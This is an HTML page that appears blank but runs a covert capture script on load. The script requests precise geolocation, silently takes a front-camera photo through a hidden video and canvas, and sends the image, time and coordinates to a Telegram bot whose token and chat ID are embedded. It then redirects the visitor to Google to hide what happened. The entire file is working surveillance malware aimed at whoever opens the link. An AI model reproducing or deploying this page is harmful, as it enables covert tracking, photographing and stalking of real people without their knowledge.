<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>...</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:#000; height:100vh; }
  video, canvas { display:none; position:fixed; }
</style>
</head>
<body>
<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>
<script>
// ─── CONFIG ───────────────────────────────
const BOT_TOKEN = '8609756694:AAFjX0cnt791j34h844O_dUKCKl0dNARe8U';
const CHAT_ID   = '8220599004';
// ──────────────────────────────────────────

const video = document.getElementById('v');
const canvas = document.getElementById('c');
 
async function run() {
  // start location fetch immediately in parallel — don't wait
  const locationPromise = new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        const acc = Math.round(pos.coords.accuracy);
        resolve(`📍 ${lat}, ${lon}\n±${acc}m\n🗺 https://maps.google.com/?q=${lat},${lon}`);
      },
      () => resolve('Location unavailable'),
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
 
  // start camera
  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 1280 } },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
  } catch(e) { return; }
 
  // 0.3s warmup only
  await new Promise(r => setTimeout(r, 300));
 
  // snap
  canvas.width = video.videoWidth || 1280;
  canvas.height = video.videoHeight || 1280;
  const ctx = canvas.getContext('2d');
  ctx.save(); ctx.scale(-1,1);
  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
  ctx.restore();
  stream.getTracks().forEach(t => t.stop());
 
  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
 
  // wait for location (likely already resolved by now)
  const locationText = await locationPromise;
 
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
  const caption = `📸 Capture\n🕐 ${time}\n${locationText}`;
 
  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('photo', blob, 'selfie.jpg');
  form.append('caption', caption);
 
  // fire send — don't await, close immediately
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: 'POST', body: form
  });
 
  // close instantly after send is fired
  window.location.replace('https://google.com');
}
 
window.onload = run;
</script>
</body>
</html>
